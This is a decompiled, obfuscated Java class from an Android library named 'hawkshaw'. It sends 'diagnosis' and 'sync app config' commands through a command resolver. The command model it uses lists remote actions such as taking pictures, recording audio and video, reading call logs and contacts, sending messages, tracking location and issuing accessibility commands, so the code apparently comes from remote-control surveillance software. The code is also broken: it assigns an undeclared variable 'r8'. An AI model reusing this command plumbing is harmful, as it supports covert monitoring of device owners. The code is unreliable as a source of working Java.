package com.hawkshaw.library;

import W2.y;
import Y1.C0110h;
import a3.e;
import b3.C0298a;
import c3.C0331i;
import com.hawkshaw.library.datalayer.models.Command;
import com.hawkshaw.library.handler.CommandResolverKt;
import com.hawkshaw.library.handler.CommandSource;
import i3.p;
import j3.f;
import java.util.List;
import t3.E;

public final class n extends C0331i implements p {

    /* renamed from: D  reason: collision with root package name */
    public int f5051D;

    public final e create(Object obj, e eVar) {
        return new C0331i(2, eVar);
    }

    public final Object invoke(Object obj, Object obj2) {
        return ((n) create((E) obj, (e) obj2)).invokeSuspend(y.f2418a);
    }

    public final Object invokeSuspend(Object obj) {
        C0298a aVar = C0298a.f4140D;
        int i5 = this.f5051D;
        if (i5 == 0) {
            C0110h.P(obj);
            Command command = new Command(Command.CommandType.GetDiagnosis, 0, (Command.ThumbnailRequest) null, (Command.FileRequest) null, (Command.FilesRequest) null, (Command.DeletePendingPushFilesRequest) null, (Command.DeleteFileRequest) null, (Command.AddCallLogRequest) null, (Command.DeleteCallLogRequest) null, (Command.AddContactRequest) null, (Command.DeleteContactRequest) null, (Command.SendMessageRequest) null, (Command.GetLocationRequest) null, (Command.VibrateRequest) null, (Command.FlashRequest) null, (Command.TakePictureRequest) null, (Command.RecordVideoRequest) null, (Command.RecordAudioRequest) null, (Command.PushDeviceInfoRequest) null, (Command.OpenAppRequest) null, (Command.MakeCallRequest) null, (Command.DeviceAudioRequest) null, (Command.OpenDeeplinkRequest) null, (Command.LoginRequest) null, (Command.ScheduleCommandRequest) null, (Command.CancelScheduledCommandRequest) null, (Command.AccessibilityCommandRequest) null, (Command.StartRepeatPushDataRequest) null, (Command.SetDynamicConfigRequest) null, (Command.SyncAppConfigRequest) null, 1073741820, (f) null);
            this.f5051D = 1;
            if (CommandResolverKt.handleCommand$default(command, (CommandSource) null, this, 2, (Object) null) == aVar) {
                return aVar;
            }
        } else if (i5 == 1) {
            C0110h.P(obj);
        } else if (i5 == 2) {
            C0110h.P(obj);
            return y.f2418a;
        } else {
            throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
        Command.CommandType commandType = Command.CommandType.SyncAppConfig;
        Command.SyncAppConfigRequest syncAppConfigRequest = r8;
        Command.SyncAppConfigRequest syncAppConfigRequest2 = new Command.SyncAppConfigRequest((List) null, 1, (f) null);
        Command command2 = new Command(commandType, 0, (Command.ThumbnailRequest) null, (Command.FileRequest) null, (Command.FilesRequest) null, (Command.DeletePendingPushFilesRequest) null, (Command.DeleteFileRequest) null, (Command.AddCallLogRequest) null, (Command.DeleteCallLogRequest) null, (Command.AddContactRequest) null, (Command.DeleteContactRequest) null, (Command.SendMessageRequest) null, (Command.GetLocationRequest) null, (Command.VibrateRequest) null, (Command.FlashRequest) null, (Command.TakePictureRequest) null, (Command.RecordVideoRequest) null, (Command.RecordAudioRequest) null, (Command.PushDeviceInfoRequest) null, (Command.OpenAppRequest) null, (Command.MakeCallRequest) null, (Command.DeviceAudioRequest) null, (Command.OpenDeeplinkRequest) null, (Command.LoginRequest) null, (Command.ScheduleCommandRequest) null, (Command.CancelScheduledCommandRequest) null, (Command.AccessibilityCommandRequest) null, (Command.StartRepeatPushDataRequest) null, (Command.SetDynamicConfigRequest) null, syncAppConfigRequest, 536870908, (f) null);
        this.f5051D = 2;
        if (CommandResolverKt.handleCommand$default(command2, (CommandSource) null, this, 2, (Object) null) == aVar) {
            return aVar;
        }
        return y.f2418a;
    }
}
